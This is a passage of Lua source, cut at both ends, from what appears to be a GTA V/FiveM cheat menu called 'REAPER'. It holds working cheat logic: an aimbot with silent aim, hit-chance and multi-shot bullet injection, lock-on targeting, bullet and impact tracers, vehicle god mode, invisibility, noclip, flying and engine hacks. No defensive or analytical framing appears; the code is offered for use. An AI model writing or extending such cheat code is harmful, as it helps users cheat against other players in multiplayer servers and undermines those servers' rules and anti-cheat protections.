                                __REAPER1__.V.BonePos = __REAPER1__.V.PrevPos
                            end
                            
                            local canDo = true
                            if __REAPER1__.A['combat:aimbot_hitchance'].toggle then
                                canDo = false
        
                                if __REAPER1__.N.IsPedShooting(__REAPER1__.V.SelfPed) then
                                    local hitc = math.random(1, 100)
        
                                    if hitc <= __REAPER1__.A['combat:aimbot_hitchance'].sindex then
                                        canDo = true
                                    elseif __REAPER1__.A['combat:aimbot_hitchancetext'].func then
                                        table.insert(__REAPER1__.T.ChanceMisses, {c = hitc, t = __REAPER1__.N.GetGameTimer() + 1500})
                                    end
                                end
                            end

                            if canDo then
                                if not __REAPER1__.A['combat:aimbot_silent'].func then
                                    local targetRotation = __REAPER1__.M.GetTargetRot(__REAPER1__.V.BonePos - __REAPER1__.N.GetGameplayCamCoord())
                                    local pedRotation = __REAPER1__.N.GetEntityRotation(__REAPER1__.V.SelfPed, 2)

                                    __REAPER1__.N.SetGameplayCamRelativeRotation(targetRotation.z - pedRotation.z, targetRotation.x, 1.0)
                                elseif __REAPER1__.N.IsPedShooting(__REAPER1__.V.SelfPed) then
                                    local weapon = __REAPER1__.N.GetSelectedPedWeapon(__REAPER1__.V.SelfPed)

                                    if __REAPER1__.A['combat:aimbot_longrange'].func then
                                        local predOffs = __REAPER1__.V.PredDist >= 10 and 10 or __REAPER1__.V.PredDist <= 0.13 and 0.13 or __REAPER1__.V.PredDist
                                        if __REAPER1__.A['combat:aimbot_syncshot'].toggle then
                                            for i = 1, __REAPER1__.A['combat:aimbot_syncshot'].sindex + 1 do
                                                __REAPER1__.N.ShootSingleBulletBetweenCoords(__REAPER1__.V.BonePos.x, __REAPER1__.V.BonePos.y - predOffs, __REAPER1__.V.BonePos.z, __REAPER1__.V.BonePos, __REAPER1__.F.FloatLength(__REAPER1__.N.GetWeaponDamage(weapon), 0), true, weapon, __REAPER1__.V.SelfPed, false, true, 100000000.0)
                                            end
                                        else
                                            __REAPER1__.N.ShootSingleBulletBetweenCoords(__REAPER1__.V.BonePos.x, __REAPER1__.V.BonePos.y - predOffs, __REAPER1__.V.BonePos.z, __REAPER1__.V.BonePos, __REAPER1__.F.FloatLength(__REAPER1__.N.GetWeaponDamage(weapon), 0), true, weapon, __REAPER1__.V.SelfPed, false, true, 100000000.0)
                                        end
                                    else
                                        if __REAPER1__.A['combat:aimbot_syncshot'].toggle then
                                            for i = 1, __REAPER1__.A['combat:aimbot_syncshot'].sindex + 1 do
                                                __REAPER1__.N.ShootSingleBulletBetweenCoords(__REAPER1__.V.BonePos.x, __REAPER1__.V.BonePos.y, __REAPER1__.V.BonePos.z + 0.3, __REAPER1__.V.BonePos, __REAPER1__.F.FloatLength(__REAPER1__.N.GetWeaponDamage(weapon), 0), true, weapon, __REAPER1__.V.SelfPed, false, true, 100000000.0)
                                            end
                                        else
                                            __REAPER1__.N.ShootSingleBulletBetweenCoords(__REAPER1__.V.BonePos.x, __REAPER1__.V.BonePos.y, __REAPER1__.V.BonePos.z + 0.3, __REAPER1__.V.BonePos, __REAPER1__.F.FloatLength(__REAPER1__.N.GetWeaponDamage(weapon), 0), true, weapon, __REAPER1__.V.SelfPed, false, true, 100000000.0)
                                        end
                                    end
                                end
                            end

                            if __REAPER1__.A['combat:aimbot_drawhitbox'].func then
                                local r, g, b, a = __REAPER1__.F.Color('combat:aimbot_colortype', 'combat:aimbot_color', 180)
                                __REAPER1__.N.DrawMarker(28, __REAPER1__.V.PrevPos.x, __REAPER1__.V.PrevPos.y, __REAPER1__.V.PrevPos.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.18, 0.18, 0.18, r, g, b, a, false, true, 2, nil, nil, nil, __REAPER1__.A['combat:aimbot_onlyonped'].func)
                            end

                            if __REAPER1__.A['combat:visuals_targettrace'].func then
                                local r, g, b, a = __REAPER1__.F.Color('combat:visuals_tcolortype', 'combat:visuals_tcolor')
                                local c, tc = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                                __REAPER1__.N.DrawLine(c.x, c.y, c.z, __REAPER1__.V.PrevPos.x, __REAPER1__.V.PrevPos.y, __REAPER1__.V.PrevPos.z, r, g, b, a)
                            end
                        end
                    end

                    if __REAPER1__.V.AimbotLockTarget then
                        if __REAPER1__.A['combat:aimbot_lockon'].func and __REAPER1__.N.DoesEntityExist(__REAPER1__.V.AimbotLockTarget) and not __REAPER1__.N.IsEntityDead(__REAPER1__.V.AimbotLockTarget) then
                            local distance = #(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.AimbotLockTarget) - __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed))
                            local hp = __REAPER1__.N.GetEntityHealth(__REAPER1__.V.AimbotLockTarget)

                            if not __REAPER1__.A['combat:aimbot_occluded'].func and not __REAPER1__.N.HasEntityClearLosToEntity(__REAPER1__.V.SelfPed, __REAPER1__.V.AimbotLockTarget, 17) or not __REAPER1__.A['combat:aimbot_vehicles'].func and __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.AimbotLockTarget) or
                            __REAPER1__.A['combat:aimbot_maxdamage'].toggle and hp - __REAPER1__.A['combat:aimbot_maxdamage'].sindex > hp or __REAPER1__.A['combat:aimbot_maxdamage'].toggle and __REAPER1__.A['combat:aimbot_distancetype'].sindex == 2 and distance >= __REAPER1__.A['combat:aimbot_distance'].sindex or
                            __REAPER1__.A['combat:aimbot_distancetype'].sindex == 3 and distance >= __REAPER1__.N.GetMaxRangeOfCurrentPedWeapon(__REAPER1__.V.SelfPed) then
                                __REAPER1__.V.AimbotLockTarget = nil
                            end
                        else
                            __REAPER1__.V.AimbotLockTarget = nil
                        end
                    end

                    if __REAPER1__.A['combat:aimbot_draw'].func then
                        local r, g, b, a = __REAPER1__.F.Color('combat:aimbot_fcolortype', 'combat:aimbot_fcolor')
                        __REAPER1__.N.DrawSprite(__REAPER1__.A['combat:aimbot_type'].sindex == 2 and 'mpinvperscommon' or 'mpmissmarkers256', __REAPER1__.A['combat:aimbot_type'].sindex == 2 and 'country_5' or 'corona_shade', 0.5, 0.5, __REAPER1__.T.AimfovPoints[180].x - __REAPER1__.T.AimfovPoints[360].x, __REAPER1__.T.AimfovPoints[90].y - __REAPER1__.T.AimfovPoints[270].y, 0.0, r, g, b, a, true)
                    end

                    if __REAPER1__.T.ChanceMisses[1] then
                        for k,v in ipairs(__REAPER1__.T.ChanceMisses) do
                            local pos = 0.02 * (k - 1)
                            __REAPER1__.F.DrawText('Missed due to hit chance (%' .. v.c .. ')', 0.0, 0.0 + pos, 0, 255, 255, 255, 255, 0.23, false, true)
            
                            if __REAPER1__.N.GetGameTimer() >= v.t then
                                table.remove(__REAPER1__.T.ChanceMisses, k)
                            end
                        end
                    end
                end

                if __REAPER1__.A['combat:visuals_lasersight'].func and __REAPER1__.N.IsPlayerFreeAiming(__REAPER1__.V.SelfPlayerId) and (__REAPER1__.A['combat:visuals_flicker'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.LaserWait or 0) or not __REAPER1__.A['combat:visuals_flicker'].func) then
                    local coords, entity = __REAPER1__.M.RayCastGameplayCamera(400.0)

                    local r, g, b, a =  __REAPER1__.F.TableToColor(__REAPER1__.A['combat:visuals_color'].menuextra)
                    if __REAPER1__.A['combat:visuals_rainbow'].func then
                        r, g, b, a =  __REAPER1__.F.RgbColors(1.0)
                    end
                    
                    __REAPER1__.N.DrawLine(__REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetCurrentPedWeaponEntityIndex(__REAPER1__.V.SelfPed)), coords, r, g, b, a)

                    if __REAPER1__.A['combat:visuals_flicker'].func then
                        __REAPER1__.V.LaserWait = __REAPER1__.N.GetGameTimer() + 300
                    end
                end

                if __REAPER1__.A['combat:visuals_tracebullets'].func then
                    local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if ret then
                        local r, g, b, a =  __REAPER1__.F.Color('combat:visuals_colortype', 'combat:visuals_bcolor')
                        table.insert(__REAPER1__.T.BulletTrace, {c = coords, c2 = __REAPER1__.N.WeaponCoords(__REAPER1__.V.SelfPed), t = not __REAPER1__.A['combat:visuals_time'].toggle and 't' or __REAPER1__.N.GetGameTimer(), r = r, g = g, b = b, a = a})
                    end

                    if not __REAPER1__.A['combat:visuals_bflicker'].func or __REAPER1__.A['combat:visuals_bflicker'].func and (__REAPER1__.V.BulletWait or 0) <= __REAPER1__.N.GetGameTimer() then
                        for k,v in ipairs(__REAPER1__.T.BulletTrace) do
                            __REAPER1__.N.DrawLine(v.c.x, v.c.y, v.c.z, v.c2.x, v.c2.y, v.c2.z, v.r, v.g, v.b, v.a)

                            if v.t ~= 't' and __REAPER1__.N.GetGameTimer() - v.t > __REAPER1__.A['combat:visuals_time'].sindex then
                                table.remove(__REAPER1__.T.BulletTrace, k)
                            end
                        end

                        if __REAPER1__.A['combat:visuals_bflicker'].func then
                            __REAPER1__.V.BulletWait = __REAPER1__.N.GetGameTimer() + 150
                        end
                    end
                end

                if __REAPER1__.A['combat:visuals_traceimpacts'].func then
                    local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.V.SelfPed)
                    if ret then
                        local r, g, b, a =  __REAPER1__.F.Color('combat:visuals_icolortype', 'combat:visuals_icolor')
                        table.insert(__REAPER1__.T.ImpactTrace, {c = coords, t = not __REAPER1__.A['combat:visuals_itime'].toggle and 't' or __REAPER1__.N.GetGameTimer(), r = r, g = g, b = b, a = a})
                    end

                    if not __REAPER1__.A['combat:visuals_iflicker'].func or __REAPER1__.A['combat:visuals_iflicker'].func and (__REAPER1__.V.ImpactWait or 0) <= __REAPER1__.N.GetGameTimer() then
                        for k,v in ipairs(__REAPER1__.T.ImpactTrace) do
                            local size = __REAPER1__.A['combat:visuals_size'].sindex / 100

                            __REAPER1__.N.DrawMarker(__REAPER1__.A['combat:visuals_type'].sindex == 1 and 43 or 28, v.c.x, v.c.y, v.c.z, 0.0, 0.0, 0.0, 0.0, __REAPER1__.A['combat:visuals_type'].sindex == 1 and 0 or 180.0, __REAPER1__.A['combat:visuals_type'].sindex == 1 and -25.0 or 0.0, size, size, size, v.r, v.g, v.b, v.a, false, __REAPER1__.A['combat:visuals_type'].sindex == 1 and 0 or 1, 2, nil, nil, nil, __REAPER1__.A['combat:visuals_onentity'].func)

                            if v.t ~= 't' and __REAPER1__.N.GetGameTimer() - v.t > __REAPER1__.A['combat:visuals_itime'].sindex then
                                table.remove(__REAPER1__.T.ImpactTrace, k)
                            end
                        end

                        if __REAPER1__.A['combat:visuals_iflicker'].func then
                            __REAPER1__.V.ImpactWait = __REAPER1__.N.GetGameTimer() + 150
                        end
                    end
                end

                if __REAPER1__.A['vehicle_toggleengine'].toggle then
                    __REAPER1__.N.SetVehicleUndriveable(__REAPER1__.V.CurrentVehicle, __REAPER1__.A['vehicle_toggleengine'].sindex == 1 and 1 or 0)
                    __REAPER1__.N.SetVehicleEngineOn(__REAPER1__.V.CurrentVehicle, __REAPER1__.A['vehicle_toggleengine'].sindex == 1 and 1 or 0, true, true)
                end

                if __REAPER1__.A['vehicle_clear'].func then
                    local lastveh = __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed, true)

                    if __REAPER1__.A['vehicle_vehiclegod'].func then
                        if __REAPER1__.V.CurrentVehicle ~= 0 and __REAPER1__.N.GetEntityCanBeDamaged(__REAPER1__.V.CurrentVehicle) then
                            __REAPER1__.N.SetEntityInvincible(__REAPER1__.V.CurrentVehicle, true)
                        elseif __REAPER1__.V.CurrentVehicle == 0 and not __REAPER1__.N.GetEntityCanBeDamaged(lastveh) then
                            __REAPER1__.N.SetEntityInvincible(lastveh, false)
                        end
                    end
                    
                    if __REAPER1__.A['vehicle_invisiblevehicle'].func then
                        if __REAPER1__.V.CurrentVehicle ~= 0 and __REAPER1__.N.IsEntityVisible(__REAPER1__.V.CurrentVehicle) then
                            __REAPER1__.N.SetEntityVisible(__REAPER1__.V.CurrentVehicle, false)
                        elseif __REAPER1__.V.CurrentVehicle == 0 and not __REAPER1__.N.IsEntityVisible(lastveh) then
                            __REAPER1__.N.SetEntityVisible(lastveh, true)
                        end
                    end
                    
                    if __REAPER1__.A['vehicle_vehiclealpha'].sindex ~= 1 then
                        if __REAPER1__.V.CurrentVehicle ~= 0 and __REAPER1__.N.GetEntityAlpha(__REAPER1__.V.CurrentVehicle) ~= __REAPER1__.A['vehicle_vehiclealpha'].func[__REAPER1__.A['vehicle_vehiclealpha'].sindex] then
                            __REAPER1__.N.SetEntityAlpha(__REAPER1__.V.CurrentVehicle, __REAPER1__.A['vehicle_vehiclealpha'].func[__REAPER1__.A['vehicle_vehiclealpha'].sindex], false)
                        elseif __REAPER1__.V.CurrentVehicle == 0 and __REAPER1__.N.GetEntityAlpha(lastveh) ~= 255 then
                            __REAPER1__.N.SetEntityAlpha(lastveh, 255, false)
                        end
                    end
                    
                    if __REAPER1__.A['vehicle_novehiclegravity'].func then
                        if __REAPER1__.V.CurrentVehicle ~= 0 and __REAPER1__.N.GetVehicleGravityAmount(__REAPER1__.V.CurrentVehicle) > 0.0 then
                            __REAPER1__.N.SetVehicleGravity(__REAPER1__.V.CurrentVehicle, false)
                        elseif __REAPER1__.V.CurrentVehicle == 0 and __REAPER1__.N.GetVehicleGravityAmount(lastveh) == 0.0 then
                            __REAPER1__.N.SetVehicleGravity(lastveh, true)
                        end
                    end
                end

                if __REAPER1__.A['vehicle_2stepvehicle'].func and __REAPER1__.V.CurrentVehicle ~= 0 and __REAPER1__.N.GetGameTimer() - (__REAPER1__.V.Vehicle2StepWait or 0) > (__REAPER1__.V.Vehicle2StepDelay or 0) then
                    local pedVehicle = __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed)

                    if __REAPER1__.N.GetPedInVehicleSeat(pedVehicle, - 1) == __REAPER1__.V.SelfPed then
                        __REAPER1__.V.Vehicle2StepWait, __REAPER1__.V.Vehicle2StepDelay = __REAPER1__.N.GetGameTimer(), math.random(250, 750)
                        local RPM = __REAPER1__.N.GetVehicleCurrentRpm(pedVehicle)
                        
                        if RPM > 0.3 and RPM < 0.6 then
                            local coords = __REAPER1__.N.GetEntityCoords(pedVehicle)
                            local backFireSize = math.random(2, 6) / 2
                            for k,v in pairs(__REAPER1__.T.Vehicle2stepLocation) do
                                if __REAPER1__.N.GetEntityBoneIndexByName(pedVehicle, v) >= 0 then
                                    local bcoords = __REAPER1__.N.GetWorldPositionOfEntityBone(pedVehicle, __REAPER1__.N.GetEntityBoneIndexByName(pedVehicle, v))
                                    __REAPER1__.N.DoParticle('core', 'veh_backfire', bcoords.x, bcoords.y, bcoords.z, backFireSize, 0, 0, 0, 0, 0, 0)
                                end
                            end
                            __REAPER1__.N.CreateExplosion(coords.x, coords.y, coords.z, 61, 0.0, true, true, 0)
                        end
                    end
                end

                if __REAPER1__.A['vehicle_displayspeed'].func then
                    if __REAPER1__.N.ShouldUseMetricMeasurements() then
                        __REAPER1__.F.DrawText('Vehicle speed: ' .. __REAPER1__.F.FloatLength(__REAPER1__.N.GetEntitySpeed(__REAPER1__.V.CurrentVehicle) *  3.6, 2) .. ' km/h', 0.015, 0.78, 0, 255, 255, 255, 170, 0.3, false, true)
                    else
                        __REAPER1__.F.DrawText('Vehicle speed: ' .. __REAPER1__.F.FloatLength(__REAPER1__.N.GetEntitySpeed(__REAPER1__.V.CurrentVehicle) * 2.23694, 2) .. 'mp/h', 0.015, 0.78, 0, 255, 255, 255, 170, 0.3, false, true)
                    end
                end

                if __REAPER1__.A['vehicle:customs:respray_rainbow'].func then
                    local r, g, b =  __REAPER1__.F.RgbColors(1.0)
                    __REAPER1__.N.SetVehicleCustomSecondaryColour(__REAPER1__.V.CurrentVehicle, r, g, b)
                    __REAPER1__.N.SetVehicleCustomPrimaryColour(__REAPER1__.V.CurrentVehicle, r, g, b)
                end

                if __REAPER1__.A['vehicle:customs:neonlights_rainbow'].func then
                    local r, g, b =  __REAPER1__.F.RgbColors(1.0)
                    __REAPER1__.N.SetVehicleNeonLightsColour(__REAPER1__.V.CurrentVehicle, r, g, b)
                end

                if __REAPER1__.A['vehicle:customs:xenonlights_random'].func and (__REAPER1__.V.XenonWait or 0) <= __REAPER1__.N.GetGameTimer() then
                    __REAPER1__.V.XenonWait = __REAPER1__.N.GetGameTimer() + 200
                    __REAPER1__.N.SetVehicleXenonLightsColour(__REAPER1__.V.CurrentVehicle, math.random(0, 12))
                end

                if __REAPER1__.A['vehicle:customs:wheels_rainbow'].func then
                    local r, g, b =  __REAPER1__.F.RgbColors(1.0)
                    __REAPER1__.N.SetVehicleTyreSmokeColor(__REAPER1__.V.CurrentVehicle, r, g, b)
                end

                if __REAPER1__.A['vehicle:customs_autotunefully'].func and __REAPER1__.V.CurrentVehicle ~= 0 then
                    if __REAPER1__.N.GetVehicleMod(__REAPER1__.V.CurrentVehicle, 12) < 2 or __REAPER1__.N.GetVehicleMod(__REAPER1__.V.CurrentVehicle, 11) < 3 or __REAPER1__.N.GetVehicleMod(__REAPER1__.V.CurrentVehicle, 13) < 2 or __REAPER1__.N.GetVehicleMod(__REAPER1__.V.CurrentVehicle, 15) < 3 or __REAPER1__.N.GetVehicleMod(__REAPER1__.V.CurrentVehicle, 16) < 4 then
                        __REAPER1__.N.TuneVehicle(__REAPER1__.V.CurrentVehicle)
                    end
                end

                if __REAPER1__.A['vehicle:customs_looprandomizelook'].func and not __REAPER1__.V.VRandomWait or __REAPER1__.A['vehicle:customs_looprandomizelook'].func and __REAPER1__.V.VRandomWait <= __REAPER1__.N.GetGameTimer() then
                    __REAPER1__.V.VRandomWait = __REAPER1__.N.GetGameTimer() + 250
                    __REAPER1__.N.RandomizeVehLook(__REAPER1__.V.CurrentVehicle)
                end

                if __REAPER1__.A['vehicle:fixing_autofixvehicle'].func and __REAPER1__.N.IsVehicleDamaged(__REAPER1__.V.CurrentVehicle) then
                    __REAPER1__.N.FixVehicle(__REAPER1__.V.CurrentVehicle)
                end

                if __REAPER1__.A['vehicle:fixing_autofixdeformation'].func and __REAPER1__.N.GetVehicleBodyHealth(__REAPER1__.V.CurrentVehicle) < 1000.0 then
                    __REAPER1__.N.SetVehicleDeformationFixed(__REAPER1__.V.CurrentVehicle)
                end

                if __REAPER1__.A['vehicle:fixing_autofixwindows'].func and __REAPER1__.N.IsWindowIntact(__REAPER1__.V.CurrentVehicle) then
                    __REAPER1__.N.FixVehicleWindows(__REAPER1__.V.CurrentVehicle)
                end

                if __REAPER1__.A['vehicle:fixing_autofixtires'].func and __REAPER1__.N.IsTirePopped(__REAPER1__.V.CurrentVehicle) then
                    __REAPER1__.N.FixVehicleTires(__REAPER1__.V.CurrentVehicle)
                end

                if __REAPER1__.A['vehicle:movement_alwayswheelie'].func then
                    __REAPER1__.N.SetVehicleWheelieState(__REAPER1__.V.CurrentVehicle, 129)
                end

                if __REAPER1__.A['vehicle:movement_bunnyhop'].func and __REAPER1__.N.IsDisabledControlJustPressed(0, 22) and __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed) then
                    __REAPER1__.N.ApplyForceToEntity(__REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed), 3,0.0 ,0.0 , 9.0, 0.0 , 0.0 , 0.0 , 0, 0, 1, 1, 0, 1)
                end

                if __REAPER1__.A['vehicle:movement_autodrive'].func then
                    if __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed, false) and __REAPER1__.N.GetPedInVehicleSeat(__REAPER1__.N.GetVehiclePedIsUsing(__REAPER1__.V.SelfPed), -1) == __REAPER1__.V.SelfPed then
                        if not __REAPER1__.V.AutoDrive then
                            __REAPER1__.N.SetDriverAbility(__REAPER1__.V.SelfPed, 1.0)
                            __REAPER1__.N.SetDriverAggressiveness(__REAPER1__.V.SelfPed, 1.0)
                            __REAPER1__.N.TaskVehicleDriveWander(__REAPER1__.V.SelfPed, __REAPER1__.N.GetVehiclePedIsUsing(__REAPER1__.V.SelfPed), 180.0, 17564220)
                            __REAPER1__.V.AutoDrive = true
                        end
                    elseif __REAPER1__.V.AutoDrive then
                        __REAPER1__.V.AutoDrive = false
                    end
                end

                if __REAPER1__.A['vehicle:movement_stickycar'].func and __REAPER1__.V.CurrentVehicle ~= 0 then
                    __REAPER1__.N.ApplyForceToEntity(__REAPER1__.V.CurrentVehicle, 1, 0, 0, -0.4, 0, 0, 0, 1, true, true, true, true, true)
                end

                if __REAPER1__.A['vehicle:movement_torque'].sindex > 1 then
                    __REAPER1__.N.SetVehicleCheatPowerIncrease(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:movement_torque'].sindex) / 100)
                end
                
                if __REAPER1__.A['vehicle:movement_rpm'].toggle then
                    __REAPER1__.N.SetVehicleCurrentRpm(__REAPER1__.V.CurrentVehicle, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:movement_rpm'].sindex - 1) * 10)
                end

                if __REAPER1__.A['vehicle:movement_hornboost'].toggle and __REAPER1__.N.IsDisabledControlJustPressed(0, 46) and __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed) then
                    local veh = __REAPER1__.N.GetVehiclePedIsUsing(__REAPER1__.V.SelfPed)
                    __REAPER1__.N.SetVehicleForwardSpeed(veh, __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:movement_hornboost'].sindex))
                    __REAPER1__.N.SetVehicleBoostActive(veh, 0, 0)
                    __REAPER1__.N.SetVehicleBoostActive(veh, 1, 0)
                    __REAPER1__.N.AnimpostfxPlay("RaceTurbo", 0, 0)
                end

                if __REAPER1__.A['vehicle:movement_autoflip'].func and __REAPER1__.V.CurrentVehicle ~= 0 then
                    local rot = __REAPER1__.N.GetEntityRotation(__REAPER1__.V.CurrentVehicle)
                    if rot[1] < - 80 and __REAPER1__.A['vehicle:movement_onlyinair'].func and __REAPER1__.N.IsEntityInAir(__REAPER1__.V.CurrentVehicle) or rot[1] < - 80 and not __REAPER1__.A['vehicle:movement_onlyinair'].func then
                        __REAPER1__.N.SetEntityRotation(__REAPER1__.V.CurrentVehicle, 0, 0, __REAPER1__.N.GetEntityHeading(__REAPER1__.V.CurrentVehicle), 1, true)
                    end
                end

                if __REAPER1__.A['vehicle:movement_flying'].func and __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed, false) then
                    local vehcoords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.CurrentVehicle)
                    local flyingspeed = not __REAPER1__.A['vehicle:movement_wlagging'].func and __REAPER1__.A['vehicle:movement_wspeed'].sindex / 10 or __REAPER1__.A['vehicle:movement_wspeed'].sindex
                    local gameplayCamRot = __REAPER1__.N.GetGameplayCamRot(0)

                    if __REAPER1__.N.IsDisabledControlPressed(0, 21) then
                        flyingspeed = flyingspeed * 3
                    elseif __REAPER1__.N.IsDisabledControlPressed(0, 36) then
                        flyingspeed = flyingspeed / 3
                    end

                    local forward, right = __REAPER1__.M.RotToQuat(gameplayCamRot) * vector3(0.0, 1.0, 0.0), __REAPER1__.M.RotToQuat(gameplayCamRot) * vector3(1.0, 0.0, 0.0)

                    if __REAPER1__.N.IsDisabledControlPressed(0, 32) then
                        __REAPER1__.V.FlyingKey = true
                        vehcoords = vehcoords + forward * flyingspeed
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 33) then
                        __REAPER1__.V.FlyingKey = true
                        vehcoords = vehcoords + forward * - flyingspeed
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 30) then
                        __REAPER1__.V.FlyingKey = true
                        vehcoords = vehcoords + right * flyingspeed
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 34) then
                        __REAPER1__.V.FlyingKey = true
                        vehcoords = vehcoords + right * - flyingspeed
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 22) then
                        __REAPER1__.V.FlyingKey = true
                        vehcoords = vector3(vehcoords.x, vehcoords.y, vehcoords.z + flyingspeed)
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(0, 38) then
                        __REAPER1__.V.FlyingKey = true
                        vehcoords = vector3(vehcoords.x, vehcoords.y, vehcoords.z - flyingspeed)
                    end

                    if __REAPER1__.V.FlyingKey and __REAPER1__.A['vehicle:movement_wlagging'].func and __REAPER1__.V.FlyingTimer <= __REAPER1__.N.GetGameTimer() or __REAPER1__.V.FlyingKey and not __REAPER1__.A['vehicle:movement_wlagging'].func then
                        if __REAPER1__.A['vehicle:movement_wlagging'].func then
                            __REAPER1__.V.FlyingTimer = __REAPER1__.N.GetGameTimer() + 200
                        end
                        __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.CurrentVehicle, vehcoords.x, vehcoords.y, vehcoords.z, true, true, true)
                    end
                    local coords = vector3(gameplayCamRot.x - __REAPER1__.N.GetDisabledControlNormal(0, 2) * 10, gameplayCamRot.y, gameplayCamRot.z - __REAPER1__.N.GetDisabledControlNormal(0, 1) * 10)
                    __REAPER1__.N.SetEntityRotation(__REAPER1__.V.CurrentVehicle, coords, 0)

                    if __REAPER1__.A['vehicle:movement_wextra'].sindex == 3 or __REAPER1__.A['vehicle:movement_wextra'].sindex == 4 then
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.CurrentVehicle, 69101.120)
                    end

                    __REAPER1__.V.FlyingKey = false
                end

                if __REAPER1__.A['vehicle:movement_noclip'].func and __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed, false) then
                    local vehcoords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.CurrentVehicle)
                    local noclipSpeed = not __REAPER1__.A['vehicle:movement_nlagging'].func and __REAPER1__.A['vehicle:movement_nspeed'].sindex / 10 or __REAPER1__.F.IntToFloat(__REAPER1__.A['vehicle:movement_nspeed'].sindex)

                    __REAPER1__.N.DisableControlAction(0, 85, true)
                    __REAPER1__.N.DisableControlAction(0, 38, true)

                    if __REAPER1__.N.IsDisabledControlPressed(0, 21) then
                        noclipSpeed = noclipSpeed * 3
                    elseif __REAPER1__.N.IsDisabledControlPressed(0, 36) then
                        noclipSpeed = noclipSpeed / 3
                    end

                    if __REAPER1__.N.IsDisabledControlPressed(1, 34) then
                        __REAPER1__.N.SetEntityHeading(__REAPER1__.V.CurrentVehicle, __REAPER1__.N.GetEntityHeading(__REAPER1__.V.CurrentVehicle) + 2.0)
                    end
                    if __REAPER1__.N.IsDisabledControlPressed(1, 9) then
                        __REAPER1__.N.SetEntityHeading(__REAPER1__.V.CurrentVehicle, __REAPER1__.N.GetEntityHeading(__REAPER1__.V.CurrentVehicle) - 2.0)
                    end

                    if not __REAPER1__.A['vehicle:movement_nlagging'].func or __REAPER1__.V.VehNoclipTimer <= __REAPER1__.N.GetGameTimer() then
                        if __REAPER1__.A['vehicle:movement_nlagging'].func then
                            __REAPER1__.V.VehNoclipTimer = __REAPER1__.N.GetGameTimer() + 200
                        end
                        if __REAPER1__.N.IsDisabledControlPressed(1, 32) then
                            vehcoords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 0.0, noclipSpeed, 0.0)
                        end
                        if __REAPER1__.N.IsDisabledControlPressed(1, 8) then
                            vehcoords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 0.0, - noclipSpeed, 0.0) 
                        end
                        if __REAPER1__.N.IsDisabledControlPressed(1, 38) then
                            vehcoords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 0.0, 0.0, noclipSpeed)
                        end
                        if __REAPER1__.N.IsDisabledControlPressed(1, 44)then
                            vehcoords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 0.0, 0.0, - noclipSpeed)
                        end
                    end

                    __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.CurrentVehicle, vehcoords, false, false, false)

                    if __REAPER1__.A['vehicle:movement_nextra'].sindex == 3 or __REAPER1__.A['vehicle:movement_nextra'].sindex == 4 then
                        __REAPER1__.N.ReaperGod(__REAPER1__.V.CurrentVehicle, 69101.120)
                    end
                end

                if __REAPER1__.A['vehicle:weapons_vehicleweapon'].func and __REAPER1__.V.CurrentVehicle ~= 0 then
                    local vehcoord = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.CurrentVehicle)
                    local direction = __REAPER1__.M.RotationToDirection(__REAPER1__.N.GetEntityRotation(__REAPER1__.V.CurrentVehicle))
                    local c, c2, c3, x, y, z, x2, y2, z2, x3, y3, z3 = nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil

                    if __REAPER1__.A['vehicle:weapons_position'].sindex == 1 then
                        c = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, -0.7, 2.2, 0)
                        c2 = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 0.7, 2.2, 0)
                        c3 = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, 0, 2.2, 0)
                        x, y, z = c.x + direction.x * 10, c.y + direction.y * 10, c.z + direction.z * 10
                        x2, y2, z2 = c2.x + direction.x * 10, c2.y + direction.y * 10, c2.z + direction.z * 10
                        x3, y3, z3 = c3.x + direction.x * 10, c3.y + direction.y * 10, c3.z + direction.z * 10
                    elseif __REAPER1__.A['vehicle:weapons_position'].sindex == 2 then
                        c = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.CurrentVehicle, -0.5, 0, 1.1)
